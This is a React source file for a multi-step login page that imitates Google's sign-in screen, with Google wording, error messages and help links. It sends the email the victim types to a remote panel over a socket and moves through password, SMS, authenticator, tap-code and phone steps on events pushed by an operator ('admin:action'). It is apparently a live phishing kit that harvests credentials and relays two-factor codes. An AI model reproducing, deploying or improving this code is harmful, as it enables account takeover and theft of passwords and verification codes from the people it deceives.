import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import PasswordStep from './PasswordStep';
import VerificationStep from './VerificationStep';
import Auth from './AuthStep';
import Logo from './assets/logo.webp';
import Phone from './Phone';
import SmsCodePg from './SmsCode';

const API_URL = process.env.NODE_ENV === 'development' 
  ? 'http://localhost:3001' 
  : 'https://panel.academyredbull.com';

const Login = () => {
  const [focused, setFocused] = useState(false);
  const socketRef = useRef(null);
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [currentStep, setCurrentStep] = useState('email');

  // Data shared between steps
  const [verificationCode, setVerificationCode] = useState('');
  const [smsCodeValue, setSmsCodeValue] = useState('');

  // ✅ reusable: move to any step with optional data
  const goToStep = (step, data = {}) => {
    console.log('[STEP] Switching to', step, data);
    setErrorMsg('');

    switch (step) {
      case 'auth':
        setCurrentStep('auth');
        break;
      case 'sms':
        setSmsCodeValue(data?.code || '');
        setCurrentStep('sms');
        break;
      case 'verification':
        setVerificationCode(data?.code || '');
        setCurrentStep('verification');
        break;
      case 'phone':
        setCurrentStep('phone');
        break;
      case 'password':
        setCurrentStep('password');
        break;
      default:
        setCurrentStep('email');
        break;
    }
  };

  // ✅ central handler for ALL server actions
const handleServerEvent = (event, data) => {
  console.log(`[SOCKET EVENT] ${event}:`, data);

  // 🔴 handle all known error events
  if ([
    "login-error",
    "password-error",
    "smscode-error",
    "authcode-error",
    "phonenumber-error"
  ].includes(event)) {

    setIsLoading(false);

    switch (event) {
      case "login-error":
        setErrorMsg("Couldn’t find your Google Account.");
        setEmail("");
        setCurrentStep("email");
        break;

      case "password-error":
        setErrorMsg("Wrong password. Try again or click Forgot password to reset it.");
        setCurrentStep("password");
        break;

      case "smscode-error":
        setErrorMsg("That code didn’t work. Please try again.");
        setCurrentStep("sms");
        break;

      case "authcode-error":
        setErrorMsg("That code didn’t work. Please try again.");
        setCurrentStep("auth");
        break;
      case "phonenumber-error":
        setErrorMsg("That phone number can’t be used for verification.");
        setCurrentStep("phone");
        break;

      default:
        setErrorMsg("Something went wrong. Please try again.");
        break;
    }

    return; // stop here after handling errors
  }

  // ✅ handle success events / redirects
  switch (event) {
    case "tap-code":
      goToStep("verification", { code: data?.code });
      break;

    case "phone-number":
      goToStep("phone");
      break;

    case "sms-code":
      goToStep("sms", { code: data?.code });
      break;

    case "auth-code":
      goToStep("auth");
      break;

    case "redirect":
      window.location.href = data?.url || "/";
      break;

    default:
      break;
  }
};


  // ✅ setup socket only once
  useEffect(() => {
    if (!socketRef.current) {
      const socket = io(API_URL, { withCredentials: true });
      socketRef.current = socket;

      socket.on('connect', () => console.log('[SOCKET] connected:', socket.id));
      socket.on('disconnect', (r) => console.log('[SOCKET] disconnected:', r));
      socket.on('connect_error', (err) =>
        console.error('[SOCKET] connect_error:', err?.message || err)
      );
socket.on('banned', (data) => {
      console.warn('[SOCKET] banned:', data);
      // Redirect to Google immediately
      window.location.href = 'https://accounts.google.com/';
    });
      // listen for both direct events and admin:action
      [
        'tap-code',
        'sms-code',
        'auth-code',
        'phone-number',
        'redirect',
        'login-error',
        'password-error',
        'smscode-error',
        'authcode-error',
        'phonenumber-error',
      ].forEach((evt) => socket.on(evt, (data) => handleServerEvent(evt, data)));

      // some backends emit "admin:action"
      socket.on('admin:action', (data) => {
        console.log('[SOCKET] admin:action', data);
        if (data?.action) handleServerEvent(data.action, data);
      });
    }
  }, []);

  const socket = socketRef.current;

  // --- email submit ---
  const handleNext = (e) => {
    e.preventDefault();
    if (!email) return;
    setIsLoading(true);
    setErrorMsg('');
    socket.emit('user:email', { email });

    setTimeout(() => {
      setIsLoading(false);
      goToStep('password');
    }, 500);
  };

  const handleBack = () => {
    goToStep('email');
    setEmail('');
    setIsLoading(false);
    setErrorMsg('');
  };

  const handleBackToPassword = () => {
    goToStep('password');
    setIsLoading(false);
    setErrorMsg('');
  };

  // ✅ when password succeeds
  const handlePasswordSuccess = ({ action, code }) => {
    console.log('[Login] handlePasswordSuccess:', action, code);
    handleServerEvent(action, { code }); // 🔥 reuse same handler
  };

  // --- Step Switching ---
  switch (currentStep) {
    case 'auth':
      return (
        <Auth
          email={email}
          socket={socket}
          onBack={handleBackToPassword}
          errorMsg={errorMsg}
        />
      );

    case 'sms':
      return (
        <SmsCodePg
          code={smsCodeValue}
          email={email}
          socket={socket}
          onBack={handleBackToPassword}
          errorMsg={errorMsg}
        />
      );

    case 'verification':
      return (
        <VerificationStep
          email={email}
          socket={socket}
          code={verificationCode}
          onBack={handleBackToPassword}
        />
      );

    case 'phone':
      return (
        <Phone
          code={smsCodeValue}
          email={email}
          socket={socket}
          onBack={handleBackToPassword}
          errorMsg={errorMsg}
        />
      );

    case 'password':
      return (
        <PasswordStep
          email={email}
          onBack={handleBack}
          onSuccess={handlePasswordSuccess}
          isLoading={isLoading}
          socket={socket}
          errorMsg={errorMsg}
        />
      );

    default:
  return (
    <div className="login-form-container">
      <div className="login-form-wrapper">
        {isLoading && (
  <div className="loading-bar-container">
    <div className="h-full bg-[#1a73e8] animate-bar1"></div>
    <div className="h-full bg-[#1a73e8] animate-bar2"></div>
  </div>
)}

        <div className="login-form-content">
          <div className="desktop-only login-form-layout">
            <div className="login-form-left">
              <div className="login-form-logo">
                <img src={Logo} alt="logo" />
              </div>
              <h1 className="login-form-title">Sign in</h1>
              <p className="login-form-subtitle">
            Use your Google Account

              </p>
            </div>

            <div className="login-form-right">
              <form onSubmit={handleNext} className="login-form-form">
                <div>
               
                 <div className="form-input-wrapper">
      <input
        id="email"
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(!!email)}
        className={`form-input ${focused || email ? 'filled' : ''} ${focused ? 'border-blue-500' : ''}`}
        required
      />

      {/* Floating label */}
      <label
        htmlFor="email"
        className="form-label"
      >
        Email or phone
      </label>
    </div>
    {errorMsg && (
  <p style={{ fontSize: '0.875rem', color: '#dc2626', marginTop: '0.5rem' }}>{errorMsg}</p>
)}

                  <div className="text-left pt-3">
                    {/* <a href="#" className="font-medium text-sm text-blue-600 hover:underline">
                      Forgot email?
                    </a> */}
                  </div>
                </div>

                <div style={{ fontSize: '0.875rem', color: '#4b5563', lineHeight: '1.25rem' }}>
                  Not your computer? Use Guest mode to sign in privately.{` `}
                  <a href="#" style={{ fontWeight: '500', color: '#2563eb', textDecoration: 'none' }} onMouseEnter={(e) => e.target.style.textDecoration = 'underline'} onMouseLeave={(e) => e.target.style.textDecoration = 'none'}>
                    Learn more about using Guest mode
                  </a>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', paddingTop: '2rem' }}>
                  <a href="#" style={{ fontSize: '0.875rem', fontWeight: '500', color: '#2563eb', textDecoration: 'none', marginRight: '1.25rem' }} onMouseEnter={(e) => e.target.style.textDecoration = 'underline'} onMouseLeave={(e) => e.target.style.textDecoration = 'none'}>
                    Create account
                  </a>
                  <button
                    type="submit"
                    disabled={!email || isLoading}
                    className="form-button"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>

          {/* Mobile Layout */}
          <div className="mobile-only">
            <div style={{ marginBottom: '2rem' }}>
              <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'flex-start', marginBottom: '1.5rem' }}>
                <img src={Logo} alt="logo" style={{ width: '80px', maxWidth: '80px', height: 'auto', marginLeft: '-11px' }} />
              </div>
              <h1 style={{ fontSize: '1.5rem', fontWeight: '400', color: '#1f2937', marginBottom: '0.5rem' }}>Sign in</h1>
              <p style={{ fontSize: '0.875rem', lineHeight: '1.25rem' }}>Use your  Account</p>
            </div>

            <form onSubmit={handleNext} className="login-form-form">
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                <div style={{ marginBottom: '0.5rem' }}>
                     <div className="form-input-wrapper">
      <input
        id="email-mobile"
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(!!email)}
        className={`form-input ${focused || email ? 'filled' : ''} ${focused ? 'border-blue-500' : ''}`}
        required
      />

      {/* Floating label */}
      <label
        htmlFor="email-mobile"
        className="form-label"
      >
        Email or phone
      </label>
    </div>
    {errorMsg && (
  <p style={{ fontSize: '0.875rem', color: '#dc2626', marginTop: '0.5rem' }}>{errorMsg}</p>
)}

                </div>
                <div style={{ textAlign: 'left' }}>
                  <a href="#" style={{ fontSize: '0.875rem', fontWeight: '500', color: '#2563eb', textDecoration: 'none' }} onMouseEnter={(e) => e.target.style.textDecoration = 'underline'} onMouseLeave={(e) => e.target.style.textDecoration = 'none'}>
                    Forgot email?
                  </a>
                </div>
              </div>

              <div style={{ fontWeight: '500', fontSize: '0.875rem', color: '#4b5563' }}>
                Not your computer? Use Private Browsing windows to sign in.{` `}
                <a href="#" style={{ fontWeight: '500', color: '#2563eb', textDecoration: 'none' }} onMouseEnter={(e) => e.target.style.textDecoration = 'underline'} onMouseLeave={(e) => e.target.style.textDecoration = 'none'}>
                  Learn more about using Guest mode
                </a>
              </div>

              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', paddingTop: '1.5rem' }}>
                <a href="#" style={{ fontSize: '0.875rem', fontWeight: '500', color: '#2563eb', textDecoration: 'none' }} onMouseEnter={(e) => e.target.style.textDecoration = 'underline'} onMouseLeave={(e) => e.target.style.textDecoration = 'none'}>
                  Create account
                </a>
                <button
                  type="submit"
                  disabled={!email || isLoading}
                  className="form-button"
                >
                 
                    Next
                  
                </button>
              </div>
            </form>
          </div>
        </div>
        <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
       {/* <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div> */}
        </footer>




      </div>
  
      
    </div>
  );
  }
}

export default Login;
